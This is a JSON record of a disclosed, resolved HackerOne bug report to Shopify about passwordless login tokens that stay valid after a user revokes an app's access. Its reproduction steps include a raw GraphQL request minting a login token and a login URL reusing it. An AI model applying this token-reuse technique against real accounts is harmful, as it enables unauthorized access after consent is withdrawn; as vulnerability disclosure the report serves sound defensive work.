{
  "id": 172837,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI4Mzc=",
  "url": "https://hackerone.com/reports/172837",
  "title": "password less login token expiration issue",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-09-29T07:28:23.083Z",
  "submitted_at": "2016-09-29T07:28:23.083Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "satishb3",
    "url": "/satishb3",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/170/fc657d5dfd17ac30235e5687c8b2d9b461e0f64e_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-10-19T15:44:17.559Z",
  "bug_reporter_agreed_on_going_public_at": "2016-10-19T15:44:17.508Z",
  "team_member_agreed_on_going_public_at": "2016-10-19T15:38:13.114Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "1. Log into Shopify iOS app as Alice and grab the token.\n2. Send the below request to generate the password less login token (The token expires after a single use. So don't use the token).\n\n    Request:\n    POST /admin/api/graphql HTTP/1.1\n    Host: seclearn.myshopify.com\n    Content-Type: application/graphql\n    Connection: close\n    X-Shopify-Access-Token: f263fb8c544a4cb965d63635a2e1c772\n    Accept: application/json\n    User-Agent: Shopify Mobile/iPhone OS/5.0 (iPhone6,2/com.jadedpixel.shopify)\n    Content-Length: 66\n    Accept-Language: en-us\n    Accept-Encoding: gzip, deflate\n\n    mutation{adminPasswordlessLogin(input:{}){passwordlessLoginToken}}\n\n    Response:\n    {\"data\":{\"adminPasswordlessLogin\":{\"passwordlessLoginToken\":\"bd7ffa6c5bf2969fa15753f8fb8cb427-1475133135\"}}}\n\n3. From desktop browser, login as Alice and revoke access to Shopify iOS app. It is revoking the access token but password less login token still works. \n\n    Replace the above login token in the below URL and it logs you in.\nhttps://seclearn.myshopify.com/admin?login_token=bd7ffa6c5bf2969fa15753f8fb8cb427-1475133135\n\nAttack scenario:\n1. User gave access to an app.\n2. App used the request and kept an unused login token. \n3. User revoked access to the app.\n4. App can still use the unused login token and access user's data.",
  "bounty_amount": "500.0",
  "formatted_bounty": "$500",
  "weakness": {
    "id": 27,
    "name": "Improper Authentication - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 8,
  "voters": [
    "drsniper",
    "yaworsk",
    "eveeez",
    "jbbbkj",
    "sumit7",
    "shivammusic",
    "spetr0x",
    "gopalsingh112"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
